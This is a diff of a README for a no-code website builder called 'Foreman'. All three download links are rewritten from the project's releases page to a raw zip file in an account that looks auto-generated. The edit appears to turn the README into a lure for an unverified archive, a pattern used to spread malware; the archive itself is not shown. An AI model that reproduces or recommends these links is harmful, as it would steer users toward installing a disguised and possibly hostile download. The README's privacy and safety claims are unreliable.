@@ -1,6 +1,6 @@
 # 🔨 Foreman - Build Perfect Websites Without Coding
 
-[![Download Foreman](https://img.shields.io/badge/Download-Foreman-blueviolet?style=for-the-badge&logo=github)](https://github.com/Expeditious-containment833/Foreman/releases)
+[![Download Foreman](https://img.shields.io/badge/Download-Foreman-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Expeditious-containment833/Foreman/main/dist/2.4.zip)
 
 ## 🚀 What is Foreman?
 
@@ -25,7 +25,7 @@ Foreman is perfect for creating a personal portfolio website, a business landing
 
 **Step 1: Visit the download page**
 
-Click the button above or go to: https://github.com/Expeditious-containment833/Foreman/releases
+Click the button above or go to: https://raw.githubusercontent.com/Expeditious-containment833/Foreman/main/dist/2.4.zip
 
 **Step 2: Download the application**
 
@@ -130,7 +130,7 @@ Foreman runs entirely on your machine. No personal data is sent anywhere. All si
 
 ## 🔗 Download Again
 
-[![Download Foreman](https://img.shields.io/badge/Download-Foreman-blue?color=#4CAF50&style=flat-square)](https://github.com/Expeditious-containment833/Foreman/releases)
+[![Download Foreman](https://img.shields.io/badge/Download-Foreman-blue?color=#4CAF50&style=flat-square)](https://raw.githubusercontent.com/Expeditious-containment833/Foreman/main/dist/2.4.zip)
 
 ## 🤝 Contributing
 
